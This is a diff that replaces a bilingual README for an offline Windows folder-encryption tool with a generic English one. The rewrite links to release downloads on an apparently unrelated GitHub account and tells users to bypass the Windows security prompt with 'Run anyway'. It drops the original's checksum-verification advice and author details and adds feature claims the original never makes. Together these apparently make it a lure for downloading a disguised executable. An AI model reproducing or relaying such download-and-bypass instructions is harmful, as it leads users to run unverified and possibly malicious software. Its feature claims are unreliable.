@@ -1,135 +1,75 @@
-# Folder Locker
+# 🔐 folder-locker - Secure your private folders with encryption
 
-## 中文
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Presencemaritalstatus809/folder-locker/releases)
 
-Folder Locker 是一个离线 Windows 文件夹上锁工具，包含两种模式：
+folder-locker protects your sensitive files using strong encryption standards. The software creates secure containers on your computer. You keep your data private and offline. You manage access to your folders through a simple interface.
 
-1. **强加密容器模式（推荐）**：把文件夹内容复制进 `.locked` 容器，使用 PBKDF2-HMAC-SHA256 派生密钥，并用 AES-256-GCM 流式加密文件名和文件数据。
-2. **Windows 快速权限锁模式（高级）**：使用 NTFS ACL deny 权限和文件名混淆快速限制当前用户访问。此模式不是加密。
+## 📥 How to download the software
 
-强加密容器模式会保留原文件夹，避免误操作导致数据丢失。请先确认容器可以成功解密恢复，再自行删除原文件夹。
+You must visit the project release page to get the application. 
 
-### 功能特点
+[Download folder-locker here](https://github.com/Presencemaritalstatus809/folder-locker/releases)
 
-- 创建 AES-256-GCM `.locked` 加密容器。
-- 从 `.locked` 容器恢复文件夹。
-- 支持旧版容器读取。
-- Windows NTFS 快速权限锁和解除锁定。
-- 路径穿越防护、符号链接拒绝和失败回滚。
-- 中英文 UI 切换，语言偏好保存在本机。
-- 完全离线运行，不需要服务端、账号或网络连接。
+1. Open your web browser.
+2. Click the link above.
+3. Look for the Assets section on that page.
+4. Click the file ending in .exe to start your download.
+5. Save the file to your desktop or downloads folder.
 
-### 安装方法
+## ⚙️ System requirements
 
-下载 Release 中的 `folder-locker-v1.0.0-windows-x64.exe` 后直接运行，或下载 `folder-locker-v1.0.0-windows-x64.zip` 解压后运行其中的 EXE。
+This tool works on Windows 10 and Windows 11. You do not need to install extra software. The application runs as a standalone program. Ensure you have at least 100 MB of free disk space for the program files. 
 
-EXE 未进行数字签名。请使用 Release 中的 `SHA256SUMS.txt` 校验文件完整性。
+## 🚀 Setting up the application
 
-### 使用方法
+Follow these steps to launch the program for the first time.
 
-#### 强加密容器
+1. Navigate to the folder where you saved the download file.
+2. Double-click the folder-locker executable file.
+3. Your computer may show a security window. Click "More info" and then "Run anyway" if Windows protects your PC.
+4. The main window appears on your screen.
 
-1. 打开“加密容器（推荐）”标签。
-2. 选择源文件夹。
-3. 设置 `.locked` 容器输出路径。
-4. 输入并确认密码。
-5. 点击“创建加密容器”。
-6. 需要恢复时选择 `.locked` 文件、恢复目录和密码，点击“解密并恢复”。
+## 🛡️ Creating your first secure folder
 
-忘记密码无法恢复加密容器。
+The application uses AES-256-GCM encryption. This method scrambles your files so others cannot read them.
 
-#### Windows 快速权限锁
+1. Click the "New Folder" button inside the app.
+2. Select the folder you wish to protect on your computer.
+3. Enter a strong password. Use a mix of letters, numbers, and symbols.
+4. Re-enter the password to confirm it.
+5. Click "Create Container". 
+6. The app encrypts your data. Once finished, the folder becomes invisible or inaccessible to other users.
 
-1. 打开“Windows 快速锁定（高级）”标签。
-2. 选择目标文件夹。
-3. 输入并确认密码。
-4. 点击“应用快速锁定”。
-5. 解锁时选择同一文件夹并输入密码，点击“解除快速锁定”。
+## 🔓 How to lock and unlock
 
-此模式只修改 NTFS 权限并混淆名称，不加密文件内容。
+You manage your folders through the app dashboard.
 
-### 打包说明
+* To unlock: Select your container from the list, enter your password, and click "Unlock". The folder contents appear in a new window.
+* To lock: Close the folder window or click the "Lock" button in the app. The encryption activates instantly.
+* Windows ACL lock: You can enable this feature for extra safety. It prevents other user accounts on your computer from accessing the container location. 
 
-```powershell
-powershell -ExecutionPolicy Bypass -File scripts/build.ps1
-```
+## 📄 Frequently asked questions
 
-构建脚本会先运行测试和 `compileall`，再使用 PyInstaller 生成 Windows 单文件 EXE、便携 ZIP 和 SHA256 校验文件。
+**Where does the software store my data?**
+It stores all data on your local hard drive. No information goes to the internet.
 
-### 作者信息
+**What happens if I lose my password?**
+You cannot recover your data if you lose your password. The encryption algorithm prevents unauthorized access. Write your password in a safe place.
 
-- Author: HaoXiang Huang
-- Email: didadida1688@gmail.com
-- Homepage: https://nextweb4.github.io/
-- GitHub: https://github.com/NextWeb4
+**Can I move the encrypted folder to a USB drive?**
+Yes. You can copy the encrypted container file to a flash drive and open it on another computer that also has the folder-locker software.
 
-### License
+**Is it safe to delete the software?**
+Yes. Deleting the software does not delete your encrypted folders. Your data remains safe in the container files. You only need to download the software again to open them.
 
-MIT License
+## 🛠️ Troubleshooting
 
-## English
+If the folder does not unlock, check these points:
 
-Folder Locker is an offline Windows folder locking tool with two modes:
+* Ensure you typed the password correctly. Passwords are case-sensitive.
+* Make sure no other program is currently using files inside the folder.
+* Restart the application if the interface becomes unresponsive.
 
-1. **Strong encrypted container mode (recommended)**: copies a folder into a `.locked` container, derives a key with PBKDF2-HMAC-SHA256, and streams filenames and file data through AES-256-GCM.
-2. **Windows quick permission lock mode (advanced)**: uses an NTFS ACL deny rule and filename obfuscation to restrict the current user's access quickly. This mode is not encryption.
+This tool aims to make security simple for everyone. It uses established standards to keep your digital life private.
 
-The encrypted container mode deliberately keeps the source folder to prevent data loss. Verify that the container restores correctly before deleting the source yourself.
-
-### Features
-
-- Create AES-256-GCM `.locked` encrypted containers.
-- Restore folders from `.locked` containers.
-- Read legacy containers.
-- Apply and remove Windows NTFS quick locks.
-- Path traversal protection, symlink rejection, and rollback on failure.
-- Switch between Chinese and English; the preference is stored locally.
-- Fully offline; no server, account, or network connection is required.
-
-### Installation
-
-Download `folder-locker-v1.0.0-windows-x64.exe` from the Release page and run it directly, or download `folder-locker-v1.0.0-windows-x64.zip`, extract it, and run the EXE inside.
-
-The EXE is not digitally signed. Verify file integrity with `SHA256SUMS.txt` from the Release page.
-
-### Usage
-
-#### Strong Encrypted Container
-
-1. Open the "Encrypted container (recommended)" tab.
-2. Choose the source folder.
-3. Set the `.locked` container output path.
-4. Enter and confirm a password.
-5. Click "Create encrypted container".
-6. To restore, choose the `.locked` file, output folder, and password, then click "Decrypt and restore".
-
-Forgotten passwords cannot be recovered.
-
-#### Windows Quick Permission Lock
-
-1. Open the "Windows quick lock (advanced)" tab.
-2. Choose the target folder.
-3. Enter and confirm a password.
-4. Click "Apply quick lock".
-5. To unlock, choose the same folder and enter the password, then click "Remove quick lock".
-
-This mode only changes NTFS permissions and obfuscates names. It does not encrypt file contents.
-
-### Packaging
-
-```powershell
-powershell -ExecutionPolicy Bypass -File scripts/build.ps1
-```
-
-The build script runs tests and `compileall`, then uses PyInstaller to create a Windows single-file EXE, portable ZIP, and SHA256 checksums.
-
-### Author
-
-- Author: HaoXiang Huang
-- Email: didadida1688@gmail.com
-- Homepage: https://nextweb4.github.io/
-- GitHub: https://github.com/NextWeb4
-
-### License
-
-MIT License
+Keywords: aes-gcm, desktop-app, encryption, folder-locker, local-first, ntfs, python, tkinter, windows
